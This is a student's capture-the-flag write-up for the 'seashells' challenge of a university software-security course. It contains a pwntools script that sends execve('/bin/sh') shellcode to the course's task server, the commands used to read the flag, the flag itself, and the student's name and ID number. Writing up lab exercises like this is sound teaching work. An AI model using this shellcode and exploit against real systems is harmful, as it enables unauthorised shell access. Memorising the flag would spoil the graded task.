# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "seashells"
- story: same as peek, but without Null bytesFinally, actual shell code shellcode. The flag path is randomized, try spawning a shell! 
- the folling script automatically exploits it:
```python
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 32885)

# shellcode from the slides
shellcode = pwn.asm('''
    mov rax, 59;
    lea rdi, [rip + sh];
    mov rsi, 0;
    mov rdx, 0;
    syscall;
    ret;
sh:
    .string "/bin/sh"
''')

print(f'shellcode: {shellcode.hex()}')
conn.recvuntil(b'please enter your (hex-encoded) shellcode, at most 4096 bytes:')
conn.sendline(shellcode.hex().encode())
conn.interactive()
```
- then
```
cd /
ls
cat flag-WkdN9EK48WVjMupL0drrdUmlVwMlm9cW
```

- flag:
```
softsec{gF-TxpcW2H0n6_emtKhUnYrmvDxVspwqfMHP0FYZOb6NOIgz92Guq7QGr0xzgY9p}
```